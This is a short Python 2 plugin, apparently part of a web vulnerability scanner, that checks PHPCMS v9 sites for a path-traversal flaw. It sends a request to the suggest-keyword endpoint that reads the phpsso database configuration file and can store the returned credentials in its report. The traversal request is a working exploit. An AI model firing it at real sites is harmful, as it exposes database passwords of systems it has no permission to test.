#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u""
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('<?php')>=0 and content.find("return array")>=0 and content.find("'default' => array")>= 0:
            request = getRequest(url+"index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php")
            response = getResponse(res)
            if ob['isstart']=='1':
                detail="验证性扫描结果：\n%s"%(content)
            #end if 
            list.append(getRecord(ob,ob['scheme']+"://"+ob['domain'],ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:PhpcmsV9ReadconfigScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:PhpcmsV9ReadconfigScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def




            
        
        
        
        
        